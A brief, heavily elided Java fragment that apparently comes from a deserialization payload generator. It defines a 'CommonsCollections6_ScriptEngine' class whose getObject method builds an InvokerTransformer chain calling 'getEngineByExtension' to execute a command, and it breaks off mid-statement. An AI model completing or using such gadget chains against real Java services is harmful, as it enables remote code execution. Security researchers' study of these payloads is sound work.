...
public class CommonsCollections6_ScriptEngine extends PayloadRunner implements ObjectPayload<Serializable> {
    ...
    public Serializable getObject(final String command) throws Exception {
        ...
        final Transformer[] transformers = new Transformer[] {
            ...
            new InvokerTransformer("getEngineByExtension", new Class[] {
